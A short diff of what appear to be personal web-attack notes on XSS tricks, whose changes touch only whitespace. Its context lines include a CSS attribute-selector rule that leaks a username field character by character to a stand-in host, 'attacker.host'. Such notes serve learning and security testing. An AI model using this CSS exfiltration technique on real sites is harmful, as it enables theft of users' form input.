@@ -17,6 +17,7 @@
 11. sometimes grab the enite page source rather then the cookie.
 12. onload and onfocus to trigger
 13. not xss but we can use css to send requests.
+
 ```css
 #username[value^="a"] {
   background: url("https://attacker.host/mikeg");
@@ -24,4 +25,4 @@
 ```
 you need to write a script to slowly guess the string each time.
 
-14. polyglots 
+14. polyglots
